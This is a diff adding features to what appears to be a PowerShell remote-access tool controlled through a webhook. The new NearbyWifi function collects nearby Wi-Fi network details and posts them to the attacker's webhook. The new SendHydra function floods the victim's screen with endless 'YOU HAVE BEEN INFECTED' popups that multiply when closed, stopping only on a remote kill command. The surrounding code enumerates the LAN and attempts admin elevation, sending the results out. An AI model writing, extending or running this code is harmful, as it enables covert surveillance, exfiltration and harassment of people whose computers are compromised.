@@ -71,6 +71,8 @@ $msgsys = "``========================================================
 = IsAdmin  : Check if the session is admin             =
 = AttemptElevate : Attempt to restart script as admin  =
 = EnumerateLAN  : Show devices on LAN (see ExtraInfo)  =
+= NearbyWifi  : Show nearby wifi networks              =
+= SendHydra  : Never ending popups (use killswitch)    =
 = Close  : Close this Session                          =
 ========================================================
 = Examples and Info -                                  =
@@ -169,6 +171,15 @@ $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":arrows_counterclock
 Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
 }
 
+Function NearbyWifi {
+$showNetworks = explorer.exe ms-availablenetworks:
+sleep 5
+$NearbyWifi = (netsh wlan show networks mode=Bssid | ?{$_ -like "SSID*" -or $_ -like "*Signal*" -or $_ -like "*Band*"}).trim() | Format-Table SSID, Signal, Band
+$Wifi = ($NearbyWifi|Out-String)
+$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = "``$Wifi``"} | ConvertTo-Json
+Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+}
+
 Function EnumerateLAN{
 param ([string]$Prefix)
 if ($Prefix.Length -eq 0){Write-Output "Use -prefix to define the first 3 parts of an IP Address eg. Enumerate-LAN -prefix 192.168.1";sleep 1 ;return}
@@ -205,6 +216,40 @@ $results = Get-Content -Path $FileOut -Raw
 $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = "$results"} | ConvertTo-Json
 Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
 rm -Path $FileOut
+}
+
+Function SendHydra {
+Add-Type -AssemblyName System.Windows.Forms
+$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":arrows_counterclockwise: ``Hydra Sent..`` :arrows_counterclockwise:"} | ConvertTo-Json
+Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+    function Create-Form {
+        $form = New-Object Windows.Forms.Form;$form.Text = "  __--** YOU HAVE BEEN INFECTED BY HYDRA **--__ ";$form.Font = 'Microsoft Sans Serif,12,style=Bold';$form.Size = New-Object Drawing.Size(300, 170);$form.StartPosition = 'Manual';$form.BackColor = [System.Drawing.Color]::Black;$form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::FixedDialog;$form.ControlBox = $false;$form.Font = 'Microsoft Sans Serif,12,style=bold';$form.ForeColor = "#FF0000"
+        $Text = New-Object Windows.Forms.Label;$Text.Text = "Cut The Head Off The Snake..`n`n    ..Two More Will Appear";$Text.Font = 'Microsoft Sans Serif,14';$Text.AutoSize = $true;$Text.Location = New-Object System.Drawing.Point(15, 20)
+        $Close = New-Object Windows.Forms.Button;$Close.Text = "Close?";$Close.Width = 120;$Close.Height = 35;$Close.BackColor = [System.Drawing.Color]::White;$Close.ForeColor = [System.Drawing.Color]::Black;$Close.DialogResult = [System.Windows.Forms.DialogResult]::OK;$Close.Location = New-Object System.Drawing.Point(85, 100);$Close.Font = 'Microsoft Sans Serif,12,style=Bold'
+        $form.Controls.AddRange(@($Text, $Close));return $form
+    }
+    while ($true) {
+        $form = Create-Form
+        $form.StartPosition = 'Manual'
+        $form.Location = New-Object System.Drawing.Point((Get-Random -Minimum 0 -Maximum 1000), (Get-Random -Minimum 0 -Maximum 1000))
+        $result = $form.ShowDialog()
+    
+        $messages = Invoke-RestMethod -Uri $GHurl
+        if ($messages -match "kill") {
+            $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":octagonal_sign: ``Hydra Stopped`` :octagonal_sign:"} | ConvertTo-Json
+            Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+            $previouscmd = $response
+            break
+        }
+        if ($result -eq [System.Windows.Forms.DialogResult]::OK) {
+            $form2 = Create-Form
+            $form2.StartPosition = 'Manual'
+            $form2.Location = New-Object System.Drawing.Point((Get-Random -Minimum 0 -Maximum 1000), (Get-Random -Minimum 0 -Maximum 1000))
+            $form2.Show()
+        }
+        $random = (Get-Random -Minimum 0 -Maximum 2)
+        Sleep $random
+    }
 }
 
 Function SpeechToText {
